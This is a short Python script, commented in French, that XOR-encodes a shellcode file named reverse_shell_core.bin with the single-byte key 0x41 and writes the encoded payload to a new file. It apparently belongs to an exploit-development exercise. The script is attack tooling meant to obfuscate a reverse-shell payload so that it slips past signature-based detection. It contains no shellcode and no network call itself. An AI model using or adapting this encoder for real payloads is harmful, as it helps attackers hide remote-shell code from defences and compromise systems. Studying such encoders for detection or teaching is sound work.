#!/usr/bin/env python3
# xor_encoder.py — encode le shellcode core avec une clé XOR

CLE = 0x41  # clé XOR = lettre 'A'

with open("payload/reverse_shell_core.bin", "rb") as f:
    shellcode = f.read()

shellcode_xor = bytes([b ^ CLE for b in shellcode])

with open("payload/reverse_shell_core_xor.bin", "wb") as f:
    f.write(shellcode_xor)

print(f"[+] Shellcode original   : {len(shellcode)} bytes")
print(f"[+] Shellcode XOR-encodé : {len(shellcode_xor)} bytes")
print(f"[+] Clé utilisée         : 0x{CLE:02x}")
print(f"[+] Produit              : payload/reverse_shell_core_xor.bin")
print(f"\n[*] Original (8 premiers bytes) : {shellcode[:8].hex()}")
print(f"[*] Encodé   (8 premiers bytes) : {shellcode_xor[:8].hex()}")